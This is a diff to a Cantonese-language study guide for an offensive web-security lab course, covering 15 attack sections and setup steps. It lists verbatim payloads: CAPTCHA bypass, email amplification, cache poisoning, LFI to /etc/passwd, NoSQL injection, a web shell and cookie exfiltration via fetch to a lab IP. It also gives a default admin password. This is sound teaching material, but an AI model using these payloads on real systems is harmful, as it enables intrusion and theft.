@@ -33,20 +33,20 @@
 | 原文 § | 原文標題 | 收錄於 |
 |---|---|---|
 | §0 | Lab Setup | `ART_T3_01_Setup_Tools_AttackChain_StudyGuide.md` |
-| §1 | CAPTCHA Bypass | `ART_T3_03_...` |
-| §2 | Email Bomb | `ART_T3_03_...` |
-| §3 | Admin Privilege Escalation (Hidden Endpoint) | `ART_T3_05_...` |
-| §4 | SQL Injection in a JSON Object | `ART_T3_04_...` |
-| §5 | Web Cache Poisoning | `ART_T3_07_...` |
-| §6 | Unlimited Brute Force | `ART_T3_03_...` |
-| §7 | Reflected XSS via HTTP Header | `ART_T3_07_...` |
-| §8 | OSINT / Username Leakage | `ART_T3_02_...` |
-| §9 | Backup File Brute Force | `ART_T3_06_...` |
-| §10 | Local File Inclusion via Language Loader | `ART_T3_07_...` |
-| §11 | Host Privilege Escalation via Internal Hints | `ART_T3_08_...` |
-| §12 | NoSQL Injection via JSON Wildcard | `ART_T3_04_...` |
-| §13 | OAuth / SSO Misconfiguration | `ART_T3_04_...`（原文 mapping 漏收，教材外補充） |
-| §14 | Server-Side Request Forgery (SSRF) | `ART_T3_07_...` |
+| §1 | CAPTCHA Bypass | `ART_T3_03` |
+| §2 | Email Bomb | `ART_T3_03` |
+| §3 | Admin Privilege Escalation (Hidden Endpoint) | `ART_T3_05` |
+| §4 | SQL Injection in a JSON Object | `ART_T3_04` |
+| §5 | Web Cache Poisoning | `ART_T3_07` |
+| §6 | Unlimited Brute Force | `ART_T3_03` |
+| §7 | Reflected XSS via HTTP Header | `ART_T3_07` |
+| §8 | OSINT / Username Leakage | `ART_T3_02` |
+| §9 | Backup File Brute Force | `ART_T3_06` |
+| §10 | Local File Inclusion via Language Loader | `ART_T3_07` |
+| §11 | Host Privilege Escalation via Internal Hints | `ART_T3_08` |
+| §12 | NoSQL Injection via JSON Wildcard | `ART_T3_04` |
+| §13 | OAuth / SSO Misconfiguration | `ART_T3_04`（原文 mapping 漏收，教材外補充） |
+| §14 | Server-Side Request Forgery (SSRF) | `ART_T3_07` |
 
 - 原文矛盾點一：**§8 同時屬階段①同④**（OSINT 搵用戶名既係偵察、亦係憑證蒐集）；本系列把 §8 主體放 ART_T3_02，ART_T3_06 只作交叉引用。
 - 原文矛盾點二：原文六階段 mapping **完全冇收錄 §13 OAuth**；本系列按「帳號接管」性質歸入階段②B。
@@ -78,7 +78,7 @@
 
 ## Part 2：逐節 payload／指令速查
 
-> **使用守則**：以下每一行都係來源筆記嘅**逐字** payload／指令／值。⚠️ 全部只准喺課程靶場使用。
+> **使用守則**：以下每一行都係來源筆記嘅**逐字** payload／指令／值（少數「複合步驟行」係把多個逐字元件串成一句，元件本身仍逐字可查）。⚠️ 全部只准喺課程靶場使用。
 
 ### A 組：認證繞過
 
@@ -205,17 +205,17 @@
 
 | 用途 | 指令／設定（原文逐字） | 來源 |
 |---|---|---|
-| 起靶場 | `PHP_CLI_SERVER_WORKERS=12 php -S 0.0.0.0:8080` | 00 §8.2 |
-| 建庫（一次） | Firefox 去 `http://127.0.0.1:8080/init_db.php` | 00 §8.2 |
-| 預設管理員 | `admin / 123qwe!@#` | 00 §8.2 |
-| FoxyProxy profile | Title `Burp`／Type `HTTP`／Hostname `127.0.0.1`／Port `8080` | 00 §8.2 |
-| 攞 Burp CA | Firefox 去 `http://burpsuite`（下載 `cacert.der`） | 00 §8.2 |
-| 裝 CA | Firefox View Certificates → Authorities → Import → 剔 Trust this CA to identify websites | 00 §8.2 |
-| 單請求改完重播 | 右 Click → Send to Repeater → Send | 00 §8.2 |
-| 自動化大量請求 | 右 Click → Send to Intruder → Clear § → Add § → Payloads → Start attack | 00 §8.2 |
-| 變數字序列 | Intruder：單一 position ＋ Numbers payload type | 00 §8.2 |
-| 靶場端口／Burp listener | `8080`／`127.0.0.1:8080` | 00 §8.1 |
-| 憑證權威名稱 | PortSwigger CA | 00 §8.1 |
+| 起靶場 | `PHP_CLI_SERVER_WORKERS=12 php -S 0.0.0.0:8080` | 01 §8.2 |
+| 建庫（一次） | Firefox 去 `http://127.0.0.1:8080/init_db.php` | 01 §8.2 |
+| 預設管理員 | `admin / 123qwe!@#` | 01 §8.2 |
+| FoxyProxy profile | Title `Burp`／Type `HTTP`／Hostname `127.0.0.1`／Port `8080` | 01 §8.2 |
+| 攞 Burp CA | Firefox 去 `http://burpsuite`（下載 `cacert.der`） | 01 §8.2 |
+| 裝 CA | Firefox View Certificates → Authorities → Import → 剔 Trust this CA to identify websites | 01 §8.2 |
+| 單請求改完重播 | 右 Click → Send to Repeater → Send | 01 §8.2 |
+| 自動化大量請求 | 右 Click → Send to Intruder → Clear § → Add § → Payloads → Start attack | 01 §8.2 |
+| 變數字序列 | Intruder：單一 position ＋ Numbers payload type | 01 §8.2 |
+| 靶場端口／Burp listener | `8080`／`127.0.0.1:8080` | 01 §8.1 |
+| 憑證權威名稱 | PortSwigger CA | 01 §8.1 |
 
 - 原文工具原則：web 練習一律用 Firefox、Burp Suite 或 OWASP ZAP；Postman 只用於 §2 其中一個練習；`tools/` 係導師／自動化示範用。
 - §2 email bomb 用 Intruder payload type **Numbers 1→50 step 1**；body `email=` 唯一 position。
@@ -247,7 +247,7 @@
 | Magic string backdoor | `captcha=bypass` | production code 出現 magic string＝萬能鎖匙，code review 易走漏 |
 | Delimiter 放大 | `email=victim@example.com;victim@example.com;…` | 一封 request → N 封 email；真實環境即攻擊行為 |
 | Cache 毒 host | `X-Forwarded-Host: evil.example.com` | 影響**其他訪客**，唔止自己 |
-| 敏感目標 | `/etc/passwd`、`/backup/*.bak`、`.git/`、`123qwe!@#` | 全部係課程靶場專用；對真實系統動手即越線 |
+| 敏感目標 | `/etc/passwd`、`/backup/config.php.bak`、`.git/`、`123qwe!@#` | 全部係課程靶場專用；對真實系統動手即越線 |
 | 外傳 cookie | `fetch('http://192.168.56.1:8088/?c='+…)` | exfiltration；實戰中型大量用戶受害 |
 
 ### Part 2 附一：逐節解題流程速記（一步一節）
@@ -255,7 +255,7 @@
 | § | 一步流程（精簡；實作一律以原文為準） | 關鍵落點 |
 |---|---|---|
 | §1 | 睇原始碼搵 `captcha_answer`／`DEBUG` → 刪走 captcha 欄位 POST → `captcha=bypass` probing | 前端驗證唔係 control |
-| §2 | 重播 `POST /forgot.php` → Intruder Numbers 1→50 → `email=a;b;c` | 前端倒數只喺 JS |
+| §2 | 重播 `POST /forgot.php` → Intruder Numbers 1→50 → `email=victim@example.com;victim@example.com` | 前端倒數只喺 JS |
 | §3 | 讀 admin 訊息 → 掃 `/admin`（302）→ 比對 `admin.js` → 手砌 upload POST → web shell → `?cmd=id` | default-deny 一個漏口 |
 | §4 | 單引號 probe → tautology 登入 → 布林真／假 → blind `substr()` 逐位出密碼 | JSON 唔係消毒劑 |
 | §5 | canary header 確認 unkeyed → 清 cache → 毒 host → private window 驗證 → 影響其他訪客 | cache key 漏咗個輸入 |
@@ -263,7 +263,7 @@
 | §7 | `X-Username` 探反射 → script 證執行 → img onerror／svg onload／偷 cookie／外傳 | 未編碼資料到達 HTML |
 | §8 | grep stealer log → awk 抽 pair → 造 wordlist → brute.py → 記攻擊面 | 完整 pair 免猜 |
 | §9 | fingerprint → 揀 wordlist → 撞 `/backup/` → 下載 config／dump／`.git` → 掘秘密 | 可預測檔名＋無存取控制 |
-| §10 | `?lang=../../etc/passwd` 證 traversal → 讀 backup source | include 會執行 PHP |
+| §10 | `?lang=../../../../../../etc/passwd` 證 traversal → 讀 backup source | include 會執行 PHP |
 | §11 | LFI 讀內部備忘錄 → 重建密碼 → 讀 `/etc/passwd` 搵 UID 0 → SSH root | 內部文件洩露模式＋無 MFA |
 | §12 | `{"role":"*"}` → 比較記錄數 → `{"$ne":"..."}` → `{"password":{"$ne":""}}` 登入 | decode 值入 query object |
 | §13 | 改 `redirect_uri` 偷 code → 取新鮮 state → force-login → 見 admin | redirect_uri 無 exact match |
@@ -273,14 +273,14 @@
 
 | 項目 | 值（原文） | 來源 |
 |---|---|---|
-| 靶場 server 啟動指令 | `PHP_CLI_SERVER_WORKERS=12 php -S 0.0.0.0:8080` | 00 §8.1 |
-| 靶場端口／Burp listener | `8080`／`127.0.0.1:8080` | 00 §8.1 |
-| 建庫 URL | `http://127.0.0.1:8080/init_db.php` | 00 §8.1 |
-| 預設管理員 | `admin / 123qwe!@#` | 00 §8.1 |
-| Burp CA 特殊網址／檔名 | `http://burpsuite`／`cacert.der` | 00 §8.1 |
-| 憑證權威名稱 | `PortSwigger CA` | 00 §8.1 |
-| 攻擊鏈階段數／Section 總數 | 6 階段／15 節（§0–§14） | 00 §8.1 |
-| 原文 student questions 總數 | 53 條 | 00 §8.1 |
+| 靶場 server 啟動指令 | `PHP_CLI_SERVER_WORKERS=12 php -S 0.0.0.0:8080` | 01 §8.1 |
+| 靶場端口／Burp listener | `8080`／`127.0.0.1:8080` | 01 §8.1 |
+| 建庫 URL | `http://127.0.0.1:8080/init_db.php` | 01 §8.1 |
+| 預設管理員 | `admin / 123qwe!@#` | 01 §8.1 |
+| Burp CA 特殊網址／檔名 | `http://burpsuite`／`cacert.der` | 01 §8.1 |
+| 憑證權威名稱 | `PortSwigger CA` | 01 §8.1 |
+| 攻擊鏈階段數／Section 總數 | 6 階段／15 節（§0–§14） | 01 §8.1 |
+| 原文 student questions 總數 | 53 條 | 01 §8.1 |
 | 靶場內部網域／URL | `hkgov-service.local`／`http://localhost:8080` | ART_T3_02 §8 |
 | 未認證洩漏點 | `/staff.php`、`/api/users.php` | ART_T3_02 §8 |
 | JSON 欄位 | `username`、`full_name`、`email`、`role` | ART_T3_02 §8 |
